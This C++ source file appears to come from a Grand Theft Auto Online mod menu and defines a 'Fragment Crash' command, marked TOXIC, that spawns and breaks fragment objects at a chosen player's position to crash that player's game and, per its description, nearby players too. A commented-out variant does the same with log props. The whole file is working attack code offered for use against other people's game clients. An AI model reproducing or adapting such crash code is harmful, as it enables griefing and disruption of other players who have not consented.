#include "core/enums.hpp"
#include "core/scr_globals.hpp"
#include "backend/player_command.hpp"
#include "gta_util.hpp"
#include "natives.hpp"
#include "util/world_model.hpp"
#include "pointers.hpp"


namespace big
{
	class fragment_crash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const command_arguments& args, const std::shared_ptr<command_context> ctx) override
		{
			Hash fraghash = 310817095; // hash untuk prop_fragtest_cnst_04
			STREAMING::REQUEST_MODEL(fraghash);

			if (PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_player_service->get_selected()->id()) == PLAYER::PLAYER_PED_ID())
			{
				// Display a warning message if the target is the player himself
				g_notification_service.push_warning("Crash", "don't crash yourself babe :/");
				return;
			}

			Vector3 targetCoords =
			    ENTITY::GET_ENTITY_COORDS(PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_player_service->get_selected()->id()), false);

			// Create and manipulate fragments
			for (int i = 0; i < 100; ++i)
			{
				// Create objects and break fragments
				Object crashstaff1 = OBJECT::CREATE_OBJECT(fraghash, targetCoords.x, targetCoords.y, targetCoords.z, true, false, false);
				OBJECT::BREAK_OBJECT_FRAGMENT_CHILD(crashstaff1, 1, false);
				ENTITY::SET_ENTITY_COORDS_NO_OFFSET(crashstaff1, targetCoords.x, targetCoords.y, targetCoords.z, false, true, true);

				Object crashstaff2 = OBJECT::CREATE_OBJECT(fraghash, targetCoords.x, targetCoords.y, targetCoords.z, true, false, false);
				OBJECT::BREAK_OBJECT_FRAGMENT_CHILD(crashstaff2, 1, false);
				ENTITY::SET_ENTITY_COORDS_NO_OFFSET(crashstaff2, targetCoords.x, targetCoords.y, targetCoords.z, false, true, true);

				// Clean up entities
				script::get_current()->yield(10ms);
				ENTITY::SET_ENTITY_AS_NO_LONGER_NEEDED(&crashstaff1);
				ENTITY::DELETE_ENTITY(&crashstaff1);

				ENTITY::SET_ENTITY_AS_NO_LONGER_NEEDED(&crashstaff2);
				ENTITY::DELETE_ENTITY(&crashstaff2);

				g_notification_service.push_success("Crash", "Sending Crash to the target");
			}

			// Second part of the crash
			for (int i = 0; i < 10; ++i)
			{
				Object crashObject = OBJECT::CREATE_OBJECT(fraghash, targetCoords.x, targetCoords.y, targetCoords.z, true, false, false);
				OBJECT::BREAK_OBJECT_FRAGMENT_CHILD(crashObject, 1, false);
				script::get_current()->yield(100ms);
				ENTITY::SET_ENTITY_AS_NO_LONGER_NEEDED(&crashObject);
				ENTITY::DELETE_ENTITY(&crashObject);

				g_notification_service.push_success("Crash", "Crash has been executed successfully");
			}

			script::get_current()->yield(2000ms);
		}

		virtual void execute(const command_arguments& args, const std::shared_ptr<command_context> ctx = std::make_shared<default_command_context>()) override
		{
		}
	};

	 fragment_crash g_fragment_crash("fragcrash", "Fragment Crash", "Will also crash other players near the target!\nBlocked by most internal menus.\nCommand : fragcrash", 0, false); //"ini command","ini button","ini description";
}


/* namespace big
{
	class fragment_crash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level() override
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const command_arguments& args, const std::shared_ptr<command_context> ctx) override
		{
			// Hash objek yang akan digunakan dalam crash
			Hash logaa = 3305783941; // prop_log_aa atau prop_toilet_01

			// Meminta model untuk objek
			STREAMING::REQUEST_MODEL(logaa);
			while (!STREAMING::HAS_MODEL_LOADED(logaa))
			{
				script::get_current()->yield(); // Tunggu hingga model selesai dimuatkan
			}

			// Mendapatkan koordinat pemain sasaran
			Vector3 targetCoords =
			    ENTITY::GET_ENTITY_COORDS(PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_player_service->get_selected()->id()), false);

			// Mengulang untuk mencipta dan memadamkan objek
			for (int i = 0; i < 100; ++i) // Ulang 100 kali
			{
				// Cipta objek di sekitar pemain sasaran menggunakan fungsi spawn
				Object a1 = big::world_model::spawn(logaa, targetCoords, true);

				// Tetapkan ciri objek: godmode, kelihatan, dan tiada collision
				if (ENTITY::DOES_ENTITY_EXIST(a1))
				{
					ENTITY::SET_ENTITY_INVINCIBLE(a1, true);        // Godmode
					ENTITY::SET_ENTITY_VISIBLE(a1, true, false);    // Visible
					ENTITY::SET_ENTITY_COLLISION(a1, false, false); // No collision

					// Biarkan objek kekal seketika sebelum dipadamkan
					script::get_current()->yield(500ms);

					// Padamkan objek selepas tempoh yang ditetapkan
					ENTITY::SET_ENTITY_AS_NO_LONGER_NEEDED(&a1);
					ENTITY::DELETE_ENTITY(&a1);

					script::get_current()->yield(300ms);
				}
			}

			// Nyahmuat model selepas selesai digunakan
			STREAMING::SET_MODEL_AS_NO_LONGER_NEEDED(logaa);

			g_notification_service.push_warning("Lynnn Menu", "Crash has been sent to targeted player :3");
		}

		virtual void execute(const command_arguments& args, const std::shared_ptr<command_context> ctx = std::make_shared<default_command_context>()) override
		{
			// Jika perlu, urus argumen dan konteks di sini
		}
	};

	fragment_crash g_fragment_crash("fragcrash", "Crash Test", "Invalid Object Crash\nBlocked by Popular Menus\nDo not spectate and stay away from the target!", 0, false);
}*/
    





